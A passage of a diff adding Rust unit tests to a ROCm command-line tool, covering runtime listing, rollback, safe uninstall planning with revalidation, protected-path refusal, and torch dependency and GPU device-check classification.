@@ -24104,6 +32057,37 @@ ID_LIKE="suse opensuse"
     }
 
     #[test]
+    fn render_runtimes_text_includes_marker_legend() -> Result<()> {
+        let (root, paths) = test_paths("runtime-marker-legend");
+        write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx120x-all-7-13-0",
+            "therock-release:gfx120X-all",
+            "7.13.0",
+            10,
+        )?;
+        let config = RocmCliConfig {
+            active_runtime_key: Some("release-pip-gfx120x-all-7-13-0".to_owned()),
+            ..RocmCliConfig::default()
+        };
+
+        let rendered = render_runtimes_text(&paths, &config)?;
+        let legend = format!(
+            "legend: {ACTIVE_RUNTIME_MARKER} = active, {ROLLBACK_RUNTIME_MARKER} = rollback target\n\n"
+        );
+        let entry = format!("{ACTIVE_RUNTIME_MARKER} release-pip-gfx120x-all-7-13-0");
+        let legend_pos = rendered.find(&legend).expect("legend line present");
+        let entry_pos = rendered.find(&entry).expect("active entry present");
+        assert!(
+            legend_pos < entry_pos,
+            "legend must appear before the entries it explains:\n{rendered}"
+        );
+
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
     fn runtime_lists_display_build_date_from_version_string() -> Result<()> {
         let (root, paths) = test_paths("runtime-build-date-display");
         let runtime_key = "release-pip-gfx120x-all-7-14-0a20260601";
@@ -24193,6 +32177,20 @@ ID_LIKE="suse opensuse"
         assert_eq!(
             config.previous_runtime_key.as_deref(),
             Some("release-pip-gfx120x-all-7-13-0")
+        );
+
+        // Rolling back a second time toggles back to where the first rollback
+        // came from — this is the guarantee the `rollback --help` text makes
+        // ("it remembers only the runtime you just left"). This test fails the
+        // moment that toggle stops holding.
+        let rolled_back_again = rollback_runtime(&paths, &mut config)?;
+        assert_eq!(
+            rolled_back_again.runtime_key,
+            "release-pip-gfx120x-all-7-13-0"
+        );
+        assert_eq!(
+            config.previous_runtime_key.as_deref(),
+            Some("release-pip-gfx120x-all-7-12-0")
         );
 
         let _ = fs::remove_dir_all(root);
@@ -24604,6 +32602,432 @@ ID_LIKE="suse opensuse"
         Ok(())
     }
 
+    #[test]
+    fn runtime_uninstall_leaves_folder_on_local_manifest_mismatch() -> Result<()> {
+        let (root, paths) = test_paths("runtime-uninstall-manifest-mismatch");
+        let manifest = write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx120x-all-7-13-0",
+            "therock-release:gfx120X-all",
+            "7.13.0",
+            20,
+        )?;
+        fs::remove_file(manifest.install_root.join(".rocm-cli-runtime.json"))?;
+        let mut config = RocmCliConfig::default();
+
+        let removed = uninstall_runtime(&paths, &mut config, &manifest.runtime_key)?;
+
+        assert!(removed.manifest_mismatch);
+        assert!(!removed.read_only);
+        assert_eq!(removed.removed_install_root, None);
+        assert!(manifest.install_root.exists());
+        assert!(!runtime_manifest_path(&paths, &manifest.runtime_key).exists());
+
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
+    fn ensure_runtime_install_root_rejects_protected_system_path() {
+        // `prune` (storage.rs) refuses a runtime whose folder sits in a
+        // protected system location before it ever calls
+        // `should_remove_runtime_install_root`. A hand-edited or corrupted
+        // registry entry could point a direct `runtimes uninstall <key>`
+        // manifest's `install_root` at the same kind of path while still
+        // carrying a matching in-tree `.rocm-cli-runtime.json`, slipping past
+        // `local_runtime_manifest_matches`. The single source of truth for
+        // "may ROCm CLI delete this folder?" must refuse it too, regardless
+        // of caller.
+        let protected = if cfg!(windows) {
+            PathBuf::from("C:/Windows/rocm-cli-test-runtime")
+        } else {
+            PathBuf::from("/etc/rocm-cli-test-runtime")
+        };
+
+        let err = ensure_runtime_install_root_is_safe_to_remove(&protected)
+            .expect_err("protected system path must be refused");
+        assert!(err.to_string().contains("protected system location"));
+    }
+
+    #[test]
+    fn plan_runtime_uninstall_does_not_mutate() -> Result<()> {
+        let (root, paths) = test_paths("runtime-uninstall-plan-dry-run");
+        let manifest = write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx120x-all-7-13-0",
+            "therock-release:gfx120X-all",
+            "7.13.0",
+            20,
+        )?;
+        let config = RocmCliConfig::default();
+
+        let plan = plan_runtime_uninstall(&paths, &config, &manifest.runtime_key)?;
+
+        assert!(plan.will_remove_install_root());
+        assert!(manifest.install_root.exists());
+        assert!(runtime_manifest_path(&paths, &manifest.runtime_key).exists());
+
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
+    fn runtime_uninstall_revalidation_detects_install_root_change() -> Result<()> {
+        let (root, paths) = test_paths("runtime-uninstall-revalidate-install-root");
+        let manifest = write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx120x-all-7-13-0",
+            "therock-release:gfx120X-all",
+            "7.13.0",
+            20,
+        )?;
+        let config = RocmCliConfig::default();
+
+        let plan = plan_runtime_uninstall(&paths, &config, &manifest.runtime_key)?;
+        assert!(plan.will_remove_install_root());
+
+        // Simulate another process relocating this runtime's install root
+        // while the uninstall confirmation prompt was waiting on the user.
+        let relocated_root = paths
+            .data_dir
+            .join("runtimes")
+            .join("wheel")
+            .join("relocated-install-root");
+        fs::rename(&manifest.install_root, &relocated_root)?;
+        let mut relocated_manifest = manifest.clone();
+        relocated_manifest.install_root = relocated_root.clone();
+        fs::write(
+            relocated_root.join(".rocm-cli-runtime.json"),
+            serde_json::to_vec_pretty(&relocated_manifest)?,
+        )?;
+        fs::write(
+            runtime_manifest_path(&paths, &manifest.runtime_key),
+            serde_json::to_vec_pretty(&relocated_manifest)?,
+        )?;
+
+        let result = revalidate_runtime_uninstall_plan(&paths, &config, plan);
+        assert!(
+            result.is_err(),
+            "revalidation should refuse a plan whose install_root moved since it was shown"
+        );
+
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
+    fn runtime_uninstall_revalidation_detects_runtime_id_change() -> Result<()> {
+        let (root, paths) = test_paths("runtime-uninstall-revalidate-runtime-id");
+        let manifest = write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx120x-all-7-13-0",
+            "therock-release:gfx120X-all",
+            "7.13.0",
+            20,
+        )?;
+        let config = RocmCliConfig::default();
+
+        let plan = plan_runtime_uninstall(&paths, &config, &manifest.runtime_key)?;
+        assert!(plan.will_remove_install_root());
+
+        // Simulate another process re-registering this runtime_key under a
+        // different runtime_id while the uninstall confirmation prompt was
+        // waiting on the user. Both the registry entry and the local marker
+        // are updated together so `install_root_decision` stays `Remove` and
+        // only `runtime_id` differs from the plan the user approved.
+        let mut relabeled_manifest = manifest.clone();
+        relabeled_manifest.runtime_id = "therock-release:gfx120X-all-relabeled".to_owned();
+        fs::write(
+            manifest.install_root.join(".rocm-cli-runtime.json"),
+            serde_json::to_vec_pretty(&relabeled_manifest)?,
+        )?;
+        fs::write(
+            runtime_manifest_path(&paths, &manifest.runtime_key),
+            serde_json::to_vec_pretty(&relabeled_manifest)?,
+        )?;
+
+        let result = revalidate_runtime_uninstall_plan(&paths, &config, plan);
+        assert!(
+            result.is_err(),
+            "revalidation should refuse a plan whose runtime_id changed since it was shown"
+        );
+
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
+    fn runtime_uninstall_revalidation_detects_was_active_change() -> Result<()> {
+        let (root, paths) = test_paths("runtime-uninstall-revalidate-was-active");
+        let target = write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx120x-all-7-13-0",
+            "therock-release:gfx120X-all",
+            "7.13.0",
+            20,
+        )?;
+        let other = write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx110x-all-7-12-0",
+            "therock-release:gfx110X-all",
+            "7.12.0",
+            10,
+        )?;
+        let mut config = RocmCliConfig {
+            active_runtime_key: Some(other.runtime_key),
+            ..RocmCliConfig::default()
+        };
+
+        let plan = plan_runtime_uninstall(&paths, &config, &target.runtime_key)?;
+        assert!(!plan.was_active);
+
+        // Simulate another process activating the target runtime while the
+        // uninstall confirmation prompt was waiting on the user.
+        config.active_runtime_key = Some(target.runtime_key);
+        config.save(&paths)?;
+
+        let result = revalidate_runtime_uninstall_plan(&paths, &config, plan);
+        assert!(
+            result.is_err(),
+            "revalidation should refuse a plan whose was_active changed since it was shown"
+        );
+
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
+    fn runtime_uninstall_revalidation_detects_clears_default_runtime_change() -> Result<()> {
+        let (root, paths) = test_paths("runtime-uninstall-revalidate-clears-default");
+        let shared_runtime_id = "therock-release:gfx120X-all";
+        let target = write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx120x-all-7-13-0",
+            shared_runtime_id,
+            "7.13.0",
+            20,
+        )?;
+        let other = write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx110x-all-7-12-0",
+            "therock-release:gfx110X-all",
+            "7.12.0",
+            10,
+        )?;
+        let config = RocmCliConfig {
+            default_runtime_id: Some(shared_runtime_id.to_owned()),
+            active_runtime_key: Some(other.runtime_key),
+            ..RocmCliConfig::default()
+        };
+
+        let plan = plan_runtime_uninstall(&paths, &config, &target.runtime_key)?;
+        assert!(!plan.was_active);
+        assert!(
+            plan.clears_default_runtime,
+            "target is the only install with the stale default runtime_id"
+        );
+
+        // Simulate another process installing a sibling that shares the
+        // target's runtime_id while the uninstall confirmation prompt was
+        // waiting on the user; the default would then survive on that
+        // sibling instead of being cleared.
+        write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx120x-all-7-13-1",
+            shared_runtime_id,
+            "7.13.1",
+            30,
+        )?;
+
+        let result = revalidate_runtime_uninstall_plan(&paths, &config, plan);
+        assert!(
+            result.is_err(),
+            "revalidation should refuse a plan whose clears_default_runtime changed since it was shown"
+        );
+
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
+    fn runtime_uninstall_revalidation_detects_install_root_decision_change() -> Result<()> {
+        let (root, paths) = test_paths("runtime-uninstall-revalidate-install-root-decision");
+        let manifest = write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx120x-all-7-13-0",
+            "therock-release:gfx120X-all",
+            "7.13.0",
+            20,
+        )?;
+        let config = RocmCliConfig::default();
+
+        let plan = plan_runtime_uninstall(&paths, &config, &manifest.runtime_key)?;
+        assert_eq!(plan.install_root_decision, InstallRootDecision::Remove);
+
+        // Simulate another process overwriting the in-tree marker with one
+        // for a different install while the uninstall confirmation prompt
+        // was waiting on the user; the registry entry (and thus runtime_id
+        // and install_root) is left untouched, so only install_root_decision
+        // should differ from the plan the user approved.
+        let mut mismatched_marker = manifest.clone();
+        mismatched_marker.runtime_key = "some-other-runtime-key".to_owned();
+        fs::write(
+            manifest.install_root.join(".rocm-cli-runtime.json"),
+            serde_json::to_vec_pretty(&mismatched_marker)?,
+        )?;
+
+        let result = revalidate_runtime_uninstall_plan(&paths, &config, plan);
+        assert!(
+            result.is_err(),
+            "revalidation should refuse a plan whose install_root_decision changed since it was shown"
+        );
+
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
+    fn confirm_and_revalidate_runtime_uninstall_refuses_state_changed_during_confirmation()
+    -> Result<()> {
+        let (root, paths) = test_paths("runtime-uninstall-confirm-and-revalidate-wiring");
+        let manifest = write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx120x-all-7-13-0",
+            "therock-release:gfx120X-all",
+            "7.13.0",
+            20,
+        )?;
+        let config = RocmCliConfig::default();
+        config.save(&paths)?;
+
+        let plan = plan_runtime_uninstall(&paths, &config, &manifest.runtime_key)?;
+        assert!(plan.will_remove_install_root());
+
+        // The injected "confirm" closure plays the role of the user
+        // approving the prompt; it relocates the install root before
+        // returning, simulating another process racing the confirmation
+        // exactly as `runtime_uninstall_revalidation_detects_install_root_change`
+        // does for the leaf function. This exercises the actual
+        // confirm -> reload-config -> revalidate wiring, not just the
+        // revalidation function in isolation: if the reload/revalidate
+        // calls were ever dropped from `confirm_and_revalidate_runtime_uninstall`,
+        // the call would silently succeed on the stale plan and this
+        // test's `result.is_err()` assertion below would fail, catching
+        // the regression.
+        let relocated_root = paths
+            .data_dir
+            .join("runtimes")
+            .join("wheel")
+            .join("relocated-install-root");
+        let install_root = manifest.install_root.clone();
+        let runtime_key = manifest.runtime_key.clone();
+        let paths_for_confirm = paths.clone();
+        let result = confirm_and_revalidate_runtime_uninstall(&paths, plan, move || {
+            fs::rename(&install_root, &relocated_root)?;
+            let mut relocated_manifest = manifest.clone();
+            relocated_manifest.install_root = relocated_root.clone();
+            fs::write(
+                relocated_root.join(".rocm-cli-runtime.json"),
+                serde_json::to_vec_pretty(&relocated_manifest)?,
+            )?;
+            fs::write(
+                runtime_manifest_path(&paths_for_confirm, &runtime_key),
+                serde_json::to_vec_pretty(&relocated_manifest)?,
+            )?;
+            Ok(true)
+        });
+
+        assert!(
+            result.is_err(),
+            "confirm_and_revalidate_runtime_uninstall must refuse to proceed when the runtime \
+             state changed while the confirmation callback was running"
+        );
+
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
+    fn runtime_uninstall_clears_default_runtime_id_for_last_sibling_even_when_not_active()
+    -> Result<()> {
+        // `runtime_id` is shared across side-by-side installs of the same
+        // release, while `runtime_key` is unique per install and
+        // `config.default_runtime_id` tracks by the shared `runtime_id`,
+        // independently of `config.active_runtime_key`. A stale
+        // `default_runtime_id` left over from before a *different* runtime
+        // was activated must still be cleared once its last remaining
+        // sibling is uninstalled — even though that sibling is not, and
+        // never was, the active runtime (`was_active` is pinned to the
+        // unrelated active runtime and never falls back to the
+        // default-id-uniqueness check while that active runtime is still
+        // installed).
+        let (root, paths) = test_paths("runtime-uninstall-shared-default-id");
+        let shared_runtime_id = "therock-release:gfx120X-all";
+        let manifest_a = write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx120x-all-7-13-0-a",
+            shared_runtime_id,
+            "7.13.0",
+            20,
+        )?;
+        let manifest_b = write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx120x-all-7-13-0-b",
+            shared_runtime_id,
+            "7.13.0",
+            21,
+        )?;
+        let active_manifest = write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx1151-7-14-0",
+            "therock-release:gfx1151",
+            "7.14.0",
+            22,
+        )?;
+        // `default_runtime_id` is stale, left over from before
+        // `active_manifest` was activated; `active_runtime_key` now points
+        // at a manifest with a completely different `runtime_id`.
+        let mut config = RocmCliConfig {
+            default_runtime_id: Some(shared_runtime_id.to_owned()),
+            active_runtime_key: Some(active_manifest.runtime_key.clone()),
+            ..RocmCliConfig::default()
+        };
+        config.save(&paths)?;
+
+        // Removing the first sibling leaves the other one behind, so the
+        // stale default (which still resolves to a real, remaining install)
+        // must not be cleared.
+        let plan_b = plan_runtime_uninstall(&paths, &config, &manifest_b.runtime_key)?;
+        assert!(!plan_b.was_active);
+        assert!(!plan_b.clears_default_runtime);
+        let removed_b = uninstall_runtime(&paths, &mut config, &manifest_b.runtime_key)?;
+        assert!(!removed_b.was_active);
+        assert!(!removed_b.default_runtime_cleared);
+        assert_eq!(
+            config.default_runtime_id.as_deref(),
+            Some(shared_runtime_id)
+        );
+
+        // Removing the last remaining sibling must clear the stale default
+        // even though this install was never the active one, and
+        // `active_runtime_key` still points at the unrelated, still-installed
+        // `active_manifest` throughout.
+        let plan_a = plan_runtime_uninstall(&paths, &config, &manifest_a.runtime_key)?;
+        assert!(!plan_a.was_active);
+        assert!(plan_a.clears_default_runtime);
+        let removed_a = uninstall_runtime(&paths, &mut config, &manifest_a.runtime_key)?;
+        assert!(!removed_a.was_active);
+        assert!(removed_a.default_runtime_cleared);
+        assert_eq!(config.default_runtime_id, None);
+        assert_eq!(
+            config.active_runtime_key.as_deref(),
+            Some(active_manifest.runtime_key.as_str())
+        );
+
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
     #[cfg(unix)]
     #[test]
     fn runtime_adopt_preserves_venv_python_symlink_path() -> Result<()> {
@@ -24824,6 +33248,1219 @@ ID_LIKE="suse opensuse"
     }
 
     #[test]
+    fn a_satisfied_dependency_check_is_stated_plainly() {
+        let rendered = render_engine_dependency_check("vllm", &EngineDependencyCheck::Satisfied);
+
+        assert_eq!(rendered, "  dependency_check: satisfied\n");
+    }
+
+    #[test]
+    fn a_violated_dependency_check_names_the_pin_and_the_remedy() {
+        // The SDK torch stack replaced the build vLLM pins. The install
+        // succeeded, so the only signal the user gets is this block.
+        let rendered = render_engine_dependency_check(
+            "vllm",
+            &EngineDependencyCheck::Violated {
+                violations: vec![
+                    "The package `vllm` requires `torch==2.10.0+git8514f05`, but `2.9.1+rocm7.14.0a20260611` is installed".to_owned(),
+                ],
+                expected: Vec::new(),
+            },
+        );
+
+        assert!(rendered.contains("  dependency_check: violated\n"));
+        assert!(rendered.contains("torch==2.10.0+git8514f05"));
+        assert!(rendered.contains("2.9.1+rocm7.14.0a20260611"));
+        assert!(rendered.contains("  action: rocm engines install vllm --reinstall\n"));
+    }
+
+    #[test]
+    fn a_divergence_on_the_realigned_package_does_not_advise_undoing_it() {
+        // The reinstall remedy is correct for a real violation and catastrophic
+        // here: it reinstates the engine's own build and restores a runtime that
+        // cannot open a device.
+        let outcome = classify_dependency_details(
+            vec![
+                "The package `vllm` requires `torch==2.11.0+gitd0c8b1f`, but `2.11.0+rocm7.13.0` is installed".to_owned(),
+            ],
+            Some("torch"),
+        );
+
+        assert!(matches!(
+            outcome,
+            EngineDependencyCheck::ExpectedDivergence(_)
+        ));
+        let rendered = render_engine_dependency_check("vllm", &outcome);
+        assert!(rendered.contains("  dependency_check: expected_divergence\n"));
+        assert!(
+            !rendered.contains("action: rocm engines install vllm --reinstall"),
+            "the reinstall remedy does not apply to a deliberate divergence: {rendered}"
+        );
+    }
+
+    #[test]
+    fn a_divergence_on_any_other_package_is_still_a_violation() {
+        // The unrelated violation is real and must keep saying so, but it does not
+        // make the deliberate torch divergence one too — and the reinstall that
+        // would repair numpy is exactly what must not be advised while the
+        // alignment stands.
+        let outcome = classify_dependency_details(
+            vec![
+                "The package `vllm` requires `torch==2.11.0+gitd0c8b1f`, but `2.11.0+rocm7.13.0` is installed".to_owned(),
+                "The package `vllm` requires `numpy==1.26.4`, but `2.0.0` is installed".to_owned(),
+            ],
+            Some("torch"),
+        );
+
+        let EngineDependencyCheck::Violated {
+            violations,
+            expected,
+        } = &outcome
+        else {
+            panic!("an unrelated violation is still a violation: {outcome:?}");
+        };
+        assert_eq!(violations.len(), 1, "only numpy violates: {violations:?}");
+        assert!(violations[0].contains("numpy"));
+        assert_eq!(expected.len(), 1, "torch diverged on purpose: {expected:?}");
+        assert!(expected[0].contains("torch"));
+
+        let rendered = render_engine_dependency_check("vllm", &outcome);
+        assert!(rendered.contains("  dependency_check: violated\n"));
+        assert!(rendered.contains("  violation: The package `vllm` requires `numpy"));
+        assert!(rendered.contains("  divergence: The package `vllm` requires `torch"));
+        assert!(
+            !rendered.contains("action: rocm engines install vllm --reinstall"),
+            "the reinstall would undo the alignment while repairing numpy: {rendered}"
+        );
+    }
+
+    #[test]
+    fn a_line_whose_subject_cannot_be_parsed_stays_a_violation() {
+        // Conservative by construction: an unrecognised shape is not evidence that
+        // the divergence was intended, so it must not be quietly excused.
+        let outcome = classify_dependency_details(
+            vec!["something uv said that this parser does not recognise".to_owned()],
+            Some("torch"),
+        );
+
+        assert!(matches!(outcome, EngineDependencyCheck::Violated { .. }));
+    }
+
+    /// The engine's build enumerates no devices against the installed SDK.
+    ///
+    /// Observed on MI300X: the engine pins a torch built for a different ROCm
+    /// version, installs it over the SDK's, and the runtime then reports zero
+    /// devices. The release is right; only the build is wrong.
+    #[test]
+    fn the_engines_build_is_replaced_by_the_sdk_build_of_the_same_release() {
+        let plan = plan_torch_alignment(
+            Some("rocm7.13.0"),
+            Some("2.11.0+gitd0c8b1f"),
+            Some("torch==2.11.0+gitd0c8b1f"),
+            "vllm",
+        );
+
+        assert_eq!(
+            plan,
+            TorchAlignmentPlan::Install {
+                wanted: "2.11.0+rocm7.13.0".to_owned(),
+                from: "2.11.0+gitd0c8b1f".to_owned(),
+            }
+        );
+    }
+
+    /// The SDK picked a torch *release* the engine does not accept.
+    ///
+    /// The mirror-image failure: here the SDK's own choice is the wrong one, and
+    /// simply keeping it would break the engine. The rule takes the release the
+    /// engine pins while still keeping the SDK's build of it — so neither the
+    /// engine's build nor the SDK's release selection wins outright.
+    #[test]
+    fn the_sdks_release_is_corrected_to_the_one_the_engine_pins() {
+        // The installed torch already carries the SDK's build, so the build is not
+        // what is wrong here — the release is. Pinning it needs the two sides to
+        // disagree on the release and agree on the build, which is the opposite of
+        // the case above; identical arguments to it would only restate that one.
+        let plan = plan_torch_alignment(
+            Some("rocm7.14.0a20260611"),
+            Some("2.11.0+rocm7.14.0a20260611"),
+            Some("torch==2.10.0+git8514f05"),
+            "vllm",
+        );
+
+        assert_eq!(
+            plan,
+            TorchAlignmentPlan::Install {
+                wanted: "2.10.0+rocm7.14.0a20260611".to_owned(),
+                from: "2.11.0+rocm7.14.0a20260611".to_owned(),
+            },
+            "the engine's release must win while the SDK's build is kept"
+        );
+    }
+
+    #[test]
+    fn an_install_is_failed_only_when_it_left_a_runtime_that_cannot_serve() {
+        let no_devices = RuntimeDeviceCheck::NoDevices {
+            torch_version: "2.11.0+gitd0c8b1f".to_owned(),
+            hip_version: "7.2.53211".to_owned(),
+        };
+        let kernel_failed = RuntimeDeviceCheck::KernelFailed {
+            torch_version: "2.11.0+rocm7.13.0".to_owned(),
+            error: "AcceleratorError: device kernel image is invalid".to_owned(),
+        };
+        let usable = RuntimeDeviceCheck::Usable {
+            device_count: 8,
+            torch_version: "2.11.0+rocm7.13.0".to_owned(),
+        };
+
+        // A machine with a GPU that this runtime cannot use, either way round.
+        assert!(install_left_runtime_unusable(
+            &no_devices,
+            &HostGpu::Detected
+        ));
+        assert!(install_left_runtime_unusable(
+            &kernel_failed,
+            &HostGpu::Detected
+        ));
+        // A machine with a GPU and a runtime that can use it.
+        assert!(!install_left_runtime_unusable(&usable, &HostGpu::Detected));
+        // On a host with no GPU both verdicts are the expected answer, not a
+        // reason to throw away a multi-gigabyte install.
+        assert!(!install_left_runtime_unusable(
+            &no_devices,
+            &HostGpu::Absent
+        ));
+        assert!(!install_left_runtime_unusable(
+            &kernel_failed,
+            &HostGpu::Absent
+        ));
+        // A host we could not examine is not a host without a GPU, but it is not
+        // evidence of one either, so it never fails the install on its own.
+        let unknown = HostGpu::NotVerified("lspci is not installed".to_owned());
+        assert!(!install_left_runtime_unusable(&no_devices, &unknown));
+        assert!(!install_left_runtime_unusable(&kernel_failed, &unknown));
+    }
+
+    #[test]
+    fn a_kernel_launch_failure_is_not_reported_as_a_usable_device() {
+        // The probe enumerated a device and then failed to run anything on it.
+        // Reading only the count calls that healthy, which is the whole defect:
+        // the install passes and the first serve dies.
+        let outcome = classify_runtime_device_probe(therock::RuntimeDeviceProbe {
+            import_ok: true,
+            torch_version: Some("2.11.0+rocm7.14.0".to_owned()),
+            hip_version: Some("7.14.0".to_owned()),
+            device_count: Some(1),
+            error: None,
+            kernel_error: Some("AcceleratorError: device kernel image is invalid".to_owned()),
+        });
+
+        assert_eq!(
+            outcome,
+            RuntimeDeviceCheck::KernelFailed {
+                torch_version: "2.11.0+rocm7.14.0".to_owned(),
+                error: "AcceleratorError: device kernel image is invalid".to_owned(),
+            }
+        );
+    }
+
+    #[test]
+    fn an_enumeration_failure_stays_a_verdict_of_its_own() {
+        // `error` still carries the failures that happen before any kernel runs.
+        // Reporting one of those as a kernel failure would name the wrong remedy.
+        let import_failed = classify_runtime_device_probe(therock::RuntimeDeviceProbe {
+            import_ok: false,
+            torch_version: None,
+            hip_version: None,
+            device_count: None,
+            error: Some("ImportError: libamdhip64.so.7".to_owned()),
+            kernel_error: None,
+        });
+        let count_raised = classify_runtime_device_probe(therock::RuntimeDeviceProbe {
+            import_ok: true,
+            torch_version: Some("2.11.0+rocm7.13.0".to_owned()),
+            hip_version: Some("7.13.0".to_owned()),
+            device_count: None,
+            error: Some("RuntimeError: HIP failed to initialize".to_owned()),
+            kernel_error: None,
+        });
+        let no_devices = classify_runtime_device_probe(therock::RuntimeDeviceProbe {
+            import_ok: true,
+            torch_version: Some("2.11.0+gitd0c8b1f".to_owned()),
+            hip_version: Some("7.13.0".to_owned()),
+            device_count: Some(0),
+            error: None,
+            kernel_error: None,
+        });
+
+        assert_eq!(
+            import_failed,
+            RuntimeDeviceCheck::NotVerified("ImportError: libamdhip64.so.7".to_owned())
+        );
+        assert_eq!(
+            count_raised,
+            RuntimeDeviceCheck::NotVerified("RuntimeError: HIP failed to initialize".to_owned())
+        );
+        assert_eq!(
+            no_devices,
+            RuntimeDeviceCheck::NoDevices {
+                torch_version: "2.11.0+gitd0c8b1f".to_owned(),
+                hip_version: "7.13.0".to_owned(),
+            }
+        );
+    }
+
+    #[test]
+    fn a_kernel_failure_is_reported_as_a_failure_and_says_what_broke() {
+        let rendered = render_runtime_device_check(&RuntimeDeviceCheck::KernelFailed {
+            torch_version: "2.11.0+rocm7.14.0".to_owned(),
+            error: "AcceleratorError: device kernel image is invalid".to_owned(),
+        });
+
+        assert!(rendered.contains("  device_check: kernel_failed\n"));
+        assert!(rendered.contains("2.11.0+rocm7.14.0"));
+        assert!(rendered.contains("device kernel image is invalid"));
+        // The remedy differs from `no_devices`, so the text must not borrow its
+        // explanation about being built for a different ROCm version.
+        assert!(!rendered.contains("Failed to infer device type"));
+        assert!(rendered.contains("no kernel image for this GPU"));
+    }
+
+    /// The engine's own pin runs: keep it, and claim no divergence from it.
+    #[test]
+    fn a_working_engine_torch_is_kept_instead_of_realigned() {
+        let retention = classify_retained_torch(
+            Some("rocm7.13.0"),
+            &RuntimeDeviceCheck::Usable {
+                device_count: 1,
+                torch_version: "2.11.0+gitd0c8b1f".to_owned(),
+            },
+            Some("torch==2.11.0+gitd0c8b1f"),
+        );
+
+        assert_eq!(
+            retention,
+            TorchRetention::EngineBuild {
+                version: "2.11.0+gitd0c8b1f".to_owned(),
+            }
+        );
+        assert_eq!(retained_diverged_package(&retention), None);
+        let rendered = render_torch_retention(&retention, "vllm");
+        assert!(
+            rendered.contains("  torch_alignment: retained_engine_build (2.11.0+gitd0c8b1f)\n")
+        );
+        assert!(rendered.contains("ran a GPU kernel with this SDK"));
+    }
+
+    /// The SDK's build of the pinned release runs: keep it, and expect the pin to
+    /// stay unsatisfied so the dependency check does not report it as a violation.
+    #[test]
+    fn a_working_sdk_torch_is_kept_as_an_intended_divergence() {
+        let retention = classify_retained_torch(
+            Some("rocm7.13.0"),
+            &RuntimeDeviceCheck::Usable {
+                device_count: 8,
+                torch_version: "2.11.0+rocm7.13.0".to_owned(),
+            },
+            Some("torch==2.11.0+gitd0c8b1f"),
+        );
+
+        assert_eq!(
+            retention,
+            TorchRetention::SdkBuild {
+                version: "2.11.0+rocm7.13.0".to_owned(),
+            }
+        );
+        assert_eq!(retained_diverged_package(&retention), Some("torch"));
+        let rendered = render_torch_retention(&retention, "vllm");
+        assert!(rendered.contains("  torch_alignment: retained_sdk_build (2.11.0+rocm7.13.0)\n"));
+        assert!(rendered.contains("the SDK's build of the release vllm pins ran a GPU kernel"));
+    }
+
+    /// Both intended builds are fixed points, so a repeated install settles rather
+    /// than swapping torch back and forth between the two package sources.
+    #[test]
+    fn repairing_a_runtime_converges_on_one_of_the_two_intended_builds() {
+        let after_engine_install = classify_retained_torch(
+            Some("rocm7.13.0"),
+            &RuntimeDeviceCheck::Usable {
+                device_count: 1,
+                torch_version: "2.11.0+gitd0c8b1f".to_owned(),
+            },
+            Some("torch==2.11.0+gitd0c8b1f"),
+        );
+        // What the realignment installs, seen on the next run over the same runtime.
+        let after_realignment = classify_retained_torch(
+            Some("rocm7.13.0"),
+            &RuntimeDeviceCheck::Usable {
+                device_count: 1,
+                torch_version: "2.11.0+rocm7.13.0".to_owned(),
+            },
+            Some("torch==2.11.0+gitd0c8b1f"),
+        );
+
+        assert!(!matches!(after_engine_install, TorchRetention::Realign));
+        assert!(!matches!(after_realignment, TorchRetention::Realign));
+    }
+
+    /// A pin that already names the SDK's build satisfies itself. Calling that an
+    /// intended divergence would suppress a violation that has not happened.
+    #[test]
+    fn a_pin_that_already_names_the_sdk_build_diverges_from_nothing() {
+        let retention = classify_retained_torch(
+            Some("rocm7.13.0"),
+            &RuntimeDeviceCheck::Usable {
+                device_count: 1,
+                torch_version: "2.11.0+rocm7.13.0".to_owned(),
+            },
+            Some("torch==2.11.0+rocm7.13.0"),
+        );
+
+        assert_eq!(
+            retention,
+            TorchRetention::EngineBuild {
+                version: "2.11.0+rocm7.13.0".to_owned(),
+            }
+        );
+        assert_eq!(retained_diverged_package(&retention), None);
+    }
+
+    /// Everything that has not been shown to work goes to the repair path — which
+    /// is what this tool did unconditionally before it could test a kernel.
+    #[test]
+    fn a_torch_that_has_not_been_shown_to_work_is_realigned() {
+        let usable = |version: &str| RuntimeDeviceCheck::Usable {
+            device_count: 1,
+            torch_version: version.to_owned(),
+        };
+        let pin = Some("torch==2.11.0+gitd0c8b1f");
+
+        // A third build nobody here installed on purpose.
+        assert_eq!(
+            classify_retained_torch(Some("rocm7.13.0"), &usable("2.9.0+cpu"), pin),
+            TorchRetention::Realign
+        );
+        // No devices at all, whatever build it is.
+        assert_eq!(
+            classify_retained_torch(
+                Some("rocm7.13.0"),
+                &RuntimeDeviceCheck::NoDevices {
+                    torch_version: "2.11.0+gitd0c8b1f".to_owned(),
+                    hip_version: "7.13.0".to_owned(),
+                },
+                pin
+            ),
+            TorchRetention::Realign
+        );
+        // A device that cannot run a kernel is never retained, not even when it
+        // holds exactly the build the engine pins.
+        assert_eq!(
+            classify_retained_torch(
+                Some("rocm7.13.0"),
+                &RuntimeDeviceCheck::KernelFailed {
+                    torch_version: "2.11.0+gitd0c8b1f".to_owned(),
